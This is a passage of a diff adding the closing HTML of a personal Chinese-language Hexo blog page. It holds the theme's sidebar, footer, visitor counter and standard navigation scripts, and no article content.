+    <a href="/2021/03/07/Immunity-Canvas-ubuntu-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" rel="prev" title="Immunity Canvas ubuntu 环境搭建">
+      <i class="fa fa-chevron-left"></i> Immunity Canvas ubuntu 环境搭建
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lockcy"
+      src="/images/harutya.jpg">
+  <p class="site-author-name" itemprop="name">lockcy</p>
+  <div class="site-description" itemprop="description">A mind at peace with all below, a heart whose love is innocent!</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">46</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/lockcy" title="GitHub → https://github.com/lockcy" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:lockcysec@qq.com" title="E-Mail → mailto:lockcysec@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+          <link rel="stylesheet" href="/dist/APlayer.min.css">
+          <div id="aplayer"></div>
+          <script type="text/javascript" src="/dist/APlayer.min.js"></script>
+          <script type="text/javascript" src="/dist/music.js"></script>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lockcy</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">129k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">1:57</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/theme-next/theme-next-pjax@0/pjax.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+    </div>
+</body>
+</html>
+<script src="/live2d-widget/autoload.js"></script>
